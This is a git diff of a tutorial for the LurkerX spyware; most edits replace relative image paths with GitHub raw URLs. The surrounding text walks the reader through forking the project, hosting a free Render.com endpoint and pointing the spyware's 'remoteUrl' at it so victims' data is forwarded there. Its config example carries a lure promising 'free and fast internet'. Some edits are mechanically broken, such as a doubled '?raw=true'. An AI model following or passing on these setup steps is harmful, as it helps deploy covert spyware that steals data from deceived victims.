@@ -17,7 +17,7 @@ It is those platforms I'd use in this tutorial, though many platforms provides s
 
 3. Fork the repository, step-by-step illustration as shown in the images below:
 
-<img src="../imgs/1.PNG" width="300" height="400">
+<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/1.PNG?raw=true?raw=true" width="300" height="400">
 
 4. Copy the link to your forked repository. For e.g, mine is https://github.com/nooby-jazy/LurkerX
 
@@ -27,20 +27,20 @@ It is those platforms I'd use in this tutorial, though many platforms provides s
 
 6. Create a new `web service`
 
-<img src="../imgs/2.PNG" width="300" height="300">
+<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/2.PNG?raw=true" width="300" height="300">
 
 7. Choose public git repository and enter the link to your GitHub fork. 
 
-<img src="../imgs/3.PNG" width="300" height="300">
+<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/3.PNG?raw=true" width="300" height="300">
 
 8. Connect and Choose `FREE` instance plan. Then jump to the bottom and click `Deploy web service`
 
-<img src="../imgs/4.PNG" width="300" height="300">
-<img src="../imgs/5.PNG" width="300" height="300">
+<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/4.PNG?raw=true" width="300" height="300">
+<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/5.PNG?raw=true" width="300" height="300">
 
 9. Render will generate a link for you. Copy the link
 
-<img src="../imgs/6.PNG" width="300" height="300">
+<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/6.PNG?raw=true" width="300" height="300">
 
 10. Go back to your GitHub account. Everything is set, you just need to make sure your generated Spyware would forward all data and information to your Render.com URL. 
 
@@ -49,13 +49,13 @@ It is those platforms I'd use in this tutorial, though many platforms provides s
 - `remoteUrl` should be your link from render.com
 - `publicRepoUrl` should be your forked repo's link. In this case mine is `https://github.com/nooby-jayz/LurkerX`.
 
-<img src="../imgs/9.PNG" width="300" height="400">
-<img src="../imgs/10.PNG" width="300" height="400">
+<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/9.PNG?raw=true" width="300" height="400">
+<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/10.PNG?raw=true" width="300" height="400">
 
 You edit this, you edit the spyware behavior.
 Don't forget to save it after editing(Also called "Committing" on GitHub)
 
-<img src="../imgs/12.PNG" width="300" height="400">
+<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/12.PNG?raw=true" width="300" height="400">
 
 This is an example of how I made mine:
 
@@ -67,7 +67,7 @@ version = 1.6.0
 
 
 [content]
-icon = icon.png
+icon = icon.PNG?raw=true
 countdowntext = "Sit tight and relax while the app configures the system for free and fast internet"
 
 [buttons]
